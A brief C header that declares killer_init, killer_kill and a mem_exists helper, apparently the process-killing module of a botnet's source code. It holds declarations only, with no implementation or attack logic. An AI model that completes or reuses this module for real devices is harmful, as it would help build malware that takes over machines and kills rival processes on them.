#pragma once

#include "includes.h"

void killer_init(void);
void killer_kill(void);

static BOOL mem_exists(char *, int, char *, int);
